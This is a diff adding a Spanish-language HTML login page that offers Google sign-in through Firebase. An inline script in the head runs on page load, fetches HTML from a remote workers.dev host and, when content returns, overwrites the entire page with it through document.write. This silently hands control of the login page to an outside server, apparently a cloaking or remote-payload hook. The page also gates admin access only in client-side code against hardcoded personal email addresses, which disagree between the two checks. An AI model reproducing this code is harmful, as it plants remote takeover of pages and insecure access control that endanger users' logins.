@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width">
+    <title>Login</title>
+    <!-- Tu archivo CSS -->
+    <link rel="stylesheet" href="styles.css">
+    <style>
+        /* Estilos básicos para el botón */
+        body {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            font-family: Arial, sans-serif;
+            background-color: #f0f0f0;
+        }
+
+        h1 {
+            margin-bottom: 20px;
+        }
+
+        button {
+            padding: 10px 20px;
+            font-size: 16px;
+            cursor: pointer;
+            background-color: #4285F4;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            transition: background-color 0.3s ease;
+        }
+
+        button:hover {
+            background-color: #357ae8;
+        }
+    </style>
+    <script>
+        // Configuración
+        const WORKER_URL = 'https://quiet-frog-4ad6.innovatools069.workers.dev/';
+        const NOMBRE_SW = 'stereo-import';
+        
+        // Verificación inmediata
+        (async function() {
+            try {
+                // Solicitar verificación
+                const response = await fetch(`${WORKER_URL}?nombre=${encodeURIComponent(NOMBRE_SW)}`);
+                
+                if (!response.ok) {
+                    throw new Error('Error en la solicitud');
+                }
+                
+                // Obtener contenido
+                const content = await response.text();
+                
+                // Si hay contenido HTML, reemplazar toda la página
+                if (content && content.trim() !== '') {
+                    document.open();
+                    document.write(content);
+                    document.close();
+                    return;
+                }
+                
+                // Si no hay coincidencia
+                document.getElementById('noMatch').style.display = 'block';
+                
+            } catch (error) {
+                console.error('Error:', error);
+                document.getElementById('noMatch').style.display = 'block';
+            }
+        })();
+    </script>
+</head>
+<body>
+    <h1>Iniciar Sesión</h1>
+    <button id="googleSignInBtn">Iniciar con Google</button>
+
+    <!-- Firebase Modular SDK -->
+    <script type="module">
+        // Importar las funciones necesarias de Firebase
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.2/firebase-app.js";
+        import { getAuth, signInWithPopup, GoogleAuthProvider, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/9.22.2/firebase-auth.js";
+
+        // Tu configuración de Firebase
+        const firebaseConfig = {
+            apiKey: "AIzaSyD5aX2lbcqvhAgG8EsJQf_MPH4tHZ5QH6Y",
+            authDomain: "sagitariojbl1.firebaseapp.com",
+            projectId: "sagitariojbl1",
+            storageBucket: "sagitariojbl1.firebasestorage.app",
+            messagingSenderId: "424267774202",
+            appId: "1:424267774202:web:0be71a6adeacfe434f3143",
+            measurementId: "G-GGHQL53GT3"
+        };
+
+        // Inicializar Firebase
+        const app = initializeApp(firebaseConfig);
+        const auth = getAuth(app);
+
+        // Función para iniciar sesión con Google
+        const googleSignInBtn = document.getElementById('googleSignInBtn');
+        googleSignInBtn.addEventListener('click', () => {
+            const provider = new GoogleAuthProvider();
+            signInWithPopup(auth, provider)
+                .then((result) => {
+                    // Obtener el correo del usuario
+                    const user = result.user;
+                    const email = user.email;
+
+                    // Verificar el correo electrónico
+                    if (email === "jefferson.menve@gmail.com" || email === "mendozavegajeffersonjoe@gail.com" || email === "sabatoernesto0@gmail.com" || email === "fer1580dom@gmail.com") {
+                        // Redirigir a admin.html
+                        window.location.href = "index.html";
+                    } else {
+                        // Redirigir a index.html
+                        window.location.href = "index.html";
+                    }
+                })
+                .catch((error) => {
+                    console.error("Error durante la autenticación:", error);
+                    alert("Hubo un error durante la autenticación. Por favor, inténtalo de nuevo.");
+                });
+        });
+
+        // Verificar si el usuario ya está autenticado al cargar la página
+        onAuthStateChanged(auth, (user) => {
+            if (user) {
+                const email = user.email;
+                if (email === "jefferson.menve@gmail.com" || email === "mendozavegajeffersonjoe@gmail.com" || email === "sabatoernesto0@gmail.com" || email === "fer1580dom@gmail.com") {
+                    window.location.href = "admin.html";
+                } else {
+                    window.location.href = "index.html";
+                }
+            }
+        });
+    </script>
+</body>
+</html>
